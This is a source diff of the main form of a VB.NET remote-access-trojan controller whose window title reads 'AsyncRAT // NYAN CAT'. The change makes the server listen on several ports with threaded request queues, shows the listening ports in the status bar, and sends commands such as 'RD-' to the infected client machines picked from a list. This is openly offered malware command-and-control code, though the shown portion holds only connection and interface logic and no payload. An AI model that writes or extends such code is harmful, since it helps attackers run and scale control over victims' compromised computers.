@@ -13,16 +13,25 @@ Imports System.IO
 '
 
 Public Class Form1
-    Public S As New ServerSocket
+    Public S As Server
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Messages.F = Me
 
-        Try
-            S.Start(Settings.PORT) 'For handling multi clients [300+] you need to use multi port.
-        Catch ex As Exception
-            MsgBox(ex.Message)
-        End Try
+        Pending.Req_In = New List(Of Incoming_Requests)
+        Dim Req_In As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf Pending.Incoming))
+        Req_In.Start()
+
+        Pending.Req_Out = New List(Of Outcoming_Requests)
+        Dim Req_Out As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf Pending.OutComing))
+        Req_Out.Start()
+
+        For Each i In Settings.Ports.ToList
+            S = New Server
+            S.Start(i)
+            'Dim SK As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf S.Start))
+            'SK.Start(i)
+        Next
 
     End Sub
 
@@ -100,7 +109,6 @@ Public Class Form1
         If LV1.SelectedItems.Count > 0 Then
             Try
 
-
                 Dim B As Byte() = SB("RD-")
 
                 For Each C As ListViewItem In LV1.SelectedItems
@@ -118,10 +126,8 @@ Public Class Form1
 
     Private Sub Timer_Status_Tick(sender As Object, e As EventArgs) Handles Timer_Status.Tick
         Try
-
-            ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]", LV1.Items.Count.ToString, LV1.SelectedItems.Count.ToString)
+            ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]       Listening Ports [{2}]", LV1.Items.Count.ToString, LV1.SelectedItems.Count.ToString, String.Join(",", Settings.Ports.ToList))
             Text = "AsyncRAT  // NYAN CAT  // " + DateTime.Now
-
         Catch ex As Exception
         End Try
     End Sub
@@ -173,4 +179,5 @@ Public Class Form1
 
 ")
     End Sub
+
 End Class
